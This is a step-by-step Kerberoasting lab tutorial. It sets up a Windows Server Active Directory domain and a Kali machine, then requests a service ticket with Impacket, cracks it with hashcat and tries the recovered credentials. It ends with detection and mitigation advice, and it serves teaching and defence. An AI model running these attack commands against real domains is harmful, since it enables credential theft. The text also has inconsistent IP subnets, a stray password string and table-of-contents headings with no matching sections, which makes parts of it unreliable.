
# Kerberoasting Lab

## 1. Configure the Lab Network

## 2. Configure Windows Server 2022

## 3. Install Active Directory Domain Services

## 4. Create the Active Directory Domain

## 5. Verify Active Directory

## 6. Configure Kali Linux

## 7. Create a Normal Domain User

## 8. Create the Service Account

## 9. Configure a Service Principal Name (SPN)

## 10. Verify the SPN

## 11. Understand Kerberoasting

## 12. Identify Kerberoastable Accounts

## 13. Install Impacket

## 14. Enumerate Service Principal Names

## 15. Request the Kerberos Service Ticket (TGS)

## 16. Extract the Kerberos TGS Hash

## 17. Perform Offline Password Auditing

## 18. Verify the Recovered Credentials

## 19. Understand the Attack Chain

## 20. Security Impact

## 21. Detection and Monitoring

## 22. Windows Event ID 4769

## 23. Kerberoasting Attack Indicators

## 24. Mitigation Strategies

## 25. Service Account Security

## 26. Least Privilege

## 27. Managed Service Accounts (gMSA)

## 28. Kerberos Encryption Security

## 29. Lab Architecture

## 30. Evidence and Screenshots

## 31. Key Takeaways
# Phase 1 — Configure VMware networking

The first thing I recommend is putting both machines on an **isolated Host-only network**.

### VMware Workstation

Go to:

**Edit → Virtual Network Editor**

Create/use a Host-only network, for example:

VMnet1

Subnet: 192.168.56.0

Mask:   255.255.255.0

You can disable VMware's DHCP server for this network because we'll assign static IPs.

Your two machines should use:

Windows Server:

192.168.1.45

  

Kali:

192.168.56.20

Both should have:

255.255.255.0

For the Windows Server, the DNS server should eventually point to:

192.168.1.45

---

# Phase 2 — Configure Windows Server 2022

Log into Windows Server.

Open PowerShell as Administrator.

First check the network adapter:

Get-NetIPAddress

Find the appropriate Ethernet interface.

You can configure the static address with:

New-NetIPAddress `

    -InterfaceAlias "Ethernet" `

    -IPAddress 192.168.1.45 `

    -PrefixLength 24

Then configure DNS to itself:

```
Set-DnsClientServerAddress `
    -InterfaceAlias "Ethernet" `
    -ServerAddresses 192.168.1.45
```

Verify:

```
ipconfig /all
```

You want to see approximately:

IPv4 Address : 192.168.1.45

Subnet Mask  : 255.255.255.0

DNS Server   : 192.168.1.45

---

# Phase 3 — Install Active Directory Domain Services

On Windows Server, open PowerShell as Administrator:

```
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
```

Check that it installed:

```
Get-WindowsFeature AD-Domain-Services
```

You should see:

[X] Active Directory Domain Services

---

# Phase 4 — Create the domain

We'll use:

Domain: HM.local

NetBIOS: HM

Run:

```
Install-ADDSForest `
    -DomainName "HM.local" `
    -DomainNetbiosName "HM" `
    -InstallDNS
```

Windows will ask you for the **Directory Services Restore Mode (DSRM)** password.

Choose a password you can remember for your HM.

The server will reboot.

---

# Phase 5 — Verify Active Directory

After reboot, log in using your domain administrator account.

Open PowerShell:

```
Get-ADDomain
```

You should get something similar to:

DNSRoot     : HM.local

NetBIOSName : HM

Also check:

```
Get-ADDomainController
```

You should see your Windows Server.

---

# Phase 6 — Configure Kali networking

On Kali:

ip addr

Find your VMware interface, probably something like:

eth0

or:

ens33

Set the IP:

```
sudo ip addr add 192.168.56.20/24 dev eth0
```

Replace `eth0` if your interface has a different name.

For the HM, DNS must point to your domain controller:

192.168.1.45

Check connectivity:

```
ping 192.168.1.45
```

You should receive replies.

Then:

```
nslookup HM.local 192.168.1.45
```

You should get a response from your Windows DNS server.

### Important

For Kerberos, **DNS is extremely important**.

If DNS isn't working, Kerberos attacks will frequently fail even though `ping` works.

---

# Phase 7 — Create the normal domain user

On Windows Server PowerShell:

```
New-ADUser `
    -Name "bob " `
    -SamAccountName "bob" `
    -UserPrincipalName "bob@HM.local" `
    -AccountPassword (Read-Host -AsSecureString "Password") `
    -Enabled $true
```

Verify:

```
Get-ADUser bob
```

You should see:

```
SamAccountName : bob
```

Enabled        : True

---

# Phase 8 — Create the service account

This is the important part of the Kerberoasting HM.

We'll create:

svc_sql

This account represents a service account running something such as SQL Server.

Create it:

```
New-ADUser `
    -Name "SQL Service Account" `
    -SamAccountName "svc_sql" `
    -UserPrincipalName "svc_sql@HM.local" `
    -AccountPassword (Read-Host -AsSecureString "Password") `
    -Enabled $true `
    -PasswordNeverExpires $true
```

```
windows7$$#@1234p
```
Verify:

```
Get-ADUser svc_sql
```

![Service Account Configuration](../images/Pasted%20image%2020260816122635.png)


---

# Phase 9 — Give the account an SPN

This is what makes the account interesting for Kerberoasting.

We'll create an example SQL SPN:

```
MSSQLSvc/sql01.HM.local:1433
```

Run:

```
setspn -S MSSQLSvc/sql01.HM.local:1433 HM\svc_sql
```

You should get something similar to:

```
Checking domain DC=HM,DC=local
```

  

Registering ServicePrincipalNames for CN=SQL Service Account,...

        MSSQLSvc/sql01.HM.local:1433

Updated object

Now verify:

```
setspn -L HM\svc_sql
```

You should see:

MSSQLSvc/sql01.HM.local:1433

You can also use:

```
Get-ADUser svc_sql -Properties ServicePrincipalNames
```
![SPN Verification](../images/Pasted%20image%2020260816125326.png)
---

# Phase 10 — Understand what we've created

At this point your AD looks like:

```
HM.LOCAL

│

├── Administrator

│

├── bob

│

└── svc_sql

      │

      └── MSSQLSvc/sql01.HM.local:1433
```

The important relationship is:

```
svc_sql

   ↓

SPN

   ↓

MSSQLSvc/sql01.HM.local:1433
```

A Kerberoasting attack abuses the fact that a domain user can request a Kerberos **service ticket (TGS)** for an SPN.

The ticket is encrypted using material derived from the service account's password.

The attacker can take that ticket offline and attempt to recover the password.

---

# Phase 11 — Install Impacket on Kali

On Kali:

```
sudo apt update

Install Impacket:

sudo apt install python3-impacket -y
```

Check:

```
impacket-GetUserSPNs -h
```

If Kali uses the script naming convention:

```
GetUserSPNs.py -h
```

you can use that instead.

---

# Phase 12 — Make sure Kali can resolve the domain

Test:

```
nslookup HM.local
```

Also:

```
nslookup sql01.HM.local
```

Because we haven't actually created a DNS record for `sql01` yet, you may want to add one on Windows.

On Windows:

```
Add-DnsServerResourceRecordA `
    -Name "sql01" `
    -ZoneName "HM.local" `
    -IPv4Address 192.168.1.45
```

Then from Kali:

```
nslookup sql01.HM.local
```

Expected:

Name:    sql01.HM.local

Address: 192.168.1.45

![DNS Configuration](../images/Pasted%20image%2020260816125415.png)
![DNS Resolution](../images/Pasted%20image%2020260816125446.png)
---

# Phase 13 — Test domain authentication

From Kali:

```
impacket-GetUserSPNs HM.local/bob
```

It will ask for the password.

If everything is configured correctly, you should see information about accounts with SPNs.

Something similar to:

```
ServicePrincipalName              Name

--------------------------------  --------

MSSQLSvc/sql01.HM.local:1433    svc_sql
```

This is an important checkpoint.

If you see `svc_sql`, your AD environment is working correctly.

---

# Phase 14 — Request the Kerberos service ticket

Now perform the actual Kerberoasting portion of the HM.

From Kali:

```
impacket-GetUserSPNs HM.local/bob -request
```

Enter the password for:

bob

You should receive output containing a Kerberos TGS hash.

It will look approximately like:

```
$krb5tgs$23$*svc_sql$HM.LOCAL$MSSQLSvc/sql01.HM.local:1433*$...
```

The exact value will be much longer.

This is the **Kerberoastable ticket**.

Save it:

nano kerberoast.txt

![Kerberoasting TGS Hash](../images/Pasted%20image%2020260816130401.png)

---

# Phase 15 — Understand what just happened

The attack chain is:

```
Kali

 │

 │ credentials for bob

 ▼

Domain Controller

 │

 │ Request TGS for SPN

 ▼

MSSQLSvc/sql01.HM.local:1433

 │

 ▼

svc_sql

 │

 ▼

Kerberos TGS

 │

 ▼

$krb5tgs$...

 │

 ▼

Offline password guessing
```

Notice something important:

**`bob` does not need to be an administrator.**

A normal domain user can request service tickets for SPNs.

That's one of the reasons Kerberoasting is important in Active Directory security.

---

# Phase 16 — Crack the HM ticket with Hashcat

If your returned ticket is RC4-HMAC (`$krb5tgs$23$`), Hashcat uses mode:

13100

Check your file:

cat kerberoast.txt

Then:

```
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

If `rockyou.txt` is compressed:

```
sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
```

Then:

```
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

For a HM, use a deliberately weak password for `svc_sql`, such as a password that you know exists in your test wordlist.

**Don't use a real password or an account from your actual network.**

---

# Phase 17 — See the recovered password

After Hashcat finishes:

```
hashcat -m 13100 kerberoast.txt --show
```

You should get something resembling:

$krb5tgs$23$*svc_sql$...:HMPassword123!

You've now completed the attack:

Domain user

     ↓

Enumerate SPNs

     ↓

Request TGS

     ↓

Extract TGS hash

     ↓

Offline cracking

     ↓

Recover service-account password

---

# Phase 18 — Verify the recovered password

You can test the credentials against the domain from Kali.

For example:

```
impacket-wmiexec 'HM/svc_sql@192.168.1.45'
```

However, **don't expect this to work just because the password was recovered**.

`svc_sql` is only a normal domain account unless you deliberately give it additional privileges.

That's actually preferable for your first lab because it lets you demonstrate the distinction between:

Credential compromise

        ≠

Administrator compromise

Later, you can build a second-stage HM where:

```
Kerberoast

    ↓

Compromise service account

    ↓

Service account has excessive privileges

    ↓

Privilege escalation

    ↓

Domain compromise
```


## Mitigation

- Use strong, unique passwords for all service accounts.
- Prefer **Group Managed Service Accounts (gMSA)** where supported, so service-account passwords are managed automatically.
- Avoid using regular user accounts for services when a managed service account is appropriate.
- Follow the **principle of least privilege** for service accounts.
- Remove unnecessary **Service Principal Names (SPNs)** and disable unused service accounts.
- Regularly audit accounts that have SPNs assigned.
- Prefer **AES-based Kerberos encryption** and phase out legacy RC4 where your environment and applications support it.
- Monitor Kerberos **TGS requests (Event ID 4769)** for unusual patterns, such as a user requesting tickets for many different services in a short period.
- Monitor for suspicious service-account authentication and unexpected privilege changes.
- Use Microsoft Defender for Identity or a SIEM to correlate Kerberos activity with other indicators of compromise.
- Rotate service-account credentials regularly, especially after suspected compromise.
- Never give service accounts unnecessary administrative privileges such as Domain Admin.